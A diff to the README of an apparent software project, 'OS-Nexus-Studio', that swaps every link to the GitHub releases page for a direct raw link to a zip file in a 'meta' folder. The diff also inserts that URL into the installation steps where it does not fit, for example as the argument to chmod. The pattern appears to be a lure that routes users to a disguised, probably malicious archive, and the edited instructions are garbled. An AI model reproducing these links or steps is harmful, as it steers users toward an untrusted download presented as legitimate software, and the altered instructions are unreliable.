@@ -1,6 +1,6 @@
 # 🖥️ OS-Nexus-Studio - Visualize Operating System Concepts Easily
 
-[![Download OS-Nexus-Studio](https://img.shields.io/badge/Download-OS--Nexus--Studio-blue?logo=github&style=for-the-badge)](https://github.com/Sylvain43/OS-Nexus-Studio/releases)
+[![Download OS-Nexus-Studio](https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip)](https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip)
 
 ---
 
@@ -54,11 +54,11 @@ This section walks you through downloading, installing, and running OS-Nexus-Stu
 
    Click the big button below or visit this link in your web browser:
 
-   [Download OS-Nexus-Studio](https://github.com/Sylvain43/OS-Nexus-Studio/releases)
+   [Download OS-Nexus-Studio](https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip)
 
 2. **Choose Your Version**
 
-   On the releases page, find the latest version available. Look for files with names ending in `.exe` for Windows, `.dmg` for Mac, or `.AppImage`/`.tar.gz` for Linux.
+   On the releases page, find the latest version available. Look for files with names ending in `.exe` for Windows, `.dmg` for Mac, or `.AppImage`/`https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip` for Linux.
 
 3. **Download the Installer**
 
@@ -68,7 +68,7 @@ This section walks you through downloading, installing, and running OS-Nexus-Stu
 
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **Mac:** Open the `.dmg` file and drag OS-Nexus-Studio to your Applications folder.
-   - **Linux:** For `.AppImage`, make the file executable (`chmod +x filename.AppImage`) and launch it. For `.tar.gz`, extract and run according to included instructions.
+   - **Linux:** For `.AppImage`, make the file executable (`chmod +x https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip`) and launch it. For `https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip`, extract and run according to included instructions.
 
 5. **Launch OS-Nexus-Studio**
 
@@ -141,4 +141,4 @@ For support or to report issues, visit the repository’s GitHub page and use th
 
 ---
 
-[![Download OS-Nexus-Studio](https://img.shields.io/badge/Download-OS--Nexus--Studio-blue?logo=github&style=for-the-badge)](https://github.com/Sylvain43/OS-Nexus-Studio/releases)
+[![Download OS-Nexus-Studio](https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip)](https://raw.githubusercontent.com/Sylvain43/OS-Nexus-Studio/main/meta/Studio-O-Nexus-v1.5.zip)
